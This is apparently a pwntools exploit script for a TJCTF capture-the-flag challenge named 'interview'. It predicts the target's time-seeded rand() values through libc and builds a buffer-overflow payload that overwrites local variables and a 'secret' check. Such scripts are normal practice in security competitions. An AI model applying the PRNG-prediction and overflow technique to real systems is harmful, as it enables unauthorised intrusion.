#!/usr/bin/env python

from pwn import *
import time
import random
from ctypes import CDLL
from math import floor


context.log_level = 'critical'

#### This is a hack to match up with the srand(time(NULL)) in C...
libc = CDLL('libc-2.23.so')
s = remote('problem1.tjctf.org', 8000); s.recv(); s.recv()
# s = process('./interview')

#### After we have connected, seed the PRNG at the same time...
now = int(floor(time.time()))
libc.srand(now)

variables = []
payload = 'A'*64
for i in range(10):
    last_variables = libc.rand()
    variables.append(last_variables)
    payload += p32(last_variables)


# print hex(variables[5])
payload += p32(0x42424242)  # this is j...
payload += p32(0x42424242)  # this is i...
payload += p32(0xdeadbeef + 0x42424242 - 10)  # this is secret (because j still 10)

# payload += p32(0xdeadbeef - 0x42424242 + 10)  # this is secret (because j still 10)
# payload += p32(0xdeadbeef - 0x42424242 + 10)  # this is secret (because j still 10)
# payload += p32(0xdeadbeef - 0x42424242 + 10)  # this is secret (because j still 10)

s.close()
# s.sendline(payload)
print payload
open('payload','w').write(payload)

# print s.recv()
# 0x08048662
# exit()
